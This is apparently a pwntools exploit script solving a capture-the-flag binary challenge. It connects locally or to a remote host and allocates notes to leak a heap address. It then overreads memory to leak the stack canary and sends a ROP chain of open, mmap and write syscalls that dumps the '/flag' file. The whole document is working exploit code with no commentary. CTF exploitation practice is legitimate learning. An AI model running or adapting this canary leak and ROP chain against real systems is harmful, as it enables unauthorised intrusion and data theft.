from pwn import *
from time import sleep

context.binary = e = ELF("./chall")
# libc = ELF("./libc.so.6")
gs="""
b *0x0000000004017C5
b *0x0000000000401959
"""
def start():
	if args.LOCAL:
		p=e.process()
		if args.GDB:
			gdb.attach(p,gdbscript=gs)
			pause()
	elif args.REMOTE:
		p=remote(args.HOST,int(args.PORT))
	return p

p = start()
addr_0 = 0
for i in range(30):
	p.sendlineafter(b">",b"1")
	if i ==0:
		p.recvuntil(b"Addr of note 0 is 0x")
		addr_0=int(p.recvuntil(b"\n").rstrip().decode(),16)
	sleep(0.1)
p.sendlineafter(b">",b"2")
p.sendlineafter(b"idx",b"0")
p.sendline(b"100")
p.sendline(b"/flag\0")
p.sendlineafter(b">",b"2")
p.sendlineafter(b"idx",b"3") # in remote, no local pls
p.sendline(f"{0x1740+0x100}".encode())
p.sendlineafter(b">",b"3")
p.sendlineafter(b"idx = ",b"3")
for i in range(0x10):
	p.recv(0x100)
	log.info("")
	sleep(0.5)
sleep(1)
p.recv(0x760+9-1)
sleep(1)
canary = u64(p.recv(8))
log.info(f"canary = {hex(canary)}")
rdi = 0x000000000040148f
rsi = 0x0000000000401493
rdx = 0x0000000000401495
rax = 0x0000000000401491
r8 = 0x000000000040149a
r9 =0x000000000040149d
r10 = 0x0000000000401497
syscall = 0x00000000004014a8
p.sendline(
		b"4"+b"\0"*23+
	   	p64(canary)+
	    p64(0)+

		p64(rsi)+p64(0)+
		p64(rdi)+p64(addr_0)+
		p64(rax)+p64(2)+
		p64(syscall)+

		p64(rdi)+p64(0x13370000)+#addr
		p64(rsi)+p64(0x1000)+ #len
		p64(rdx)+p64(1)+ #prot
		p64(r10)+p64(2)+ #flags
		p64(r8)+p64(3)+ #fd
		p64(r9)+p64(0)+ #off
		p64(rax)+p64(9)+
		p64(syscall)+

		p64(rdi)+p64(1)+
		p64(rsi)+p64(0x13370000)+
		p64(rdx)+p64(0x100)+
		p64(rax)+p64(1)+
		p64(syscall)
)
p.interactive()
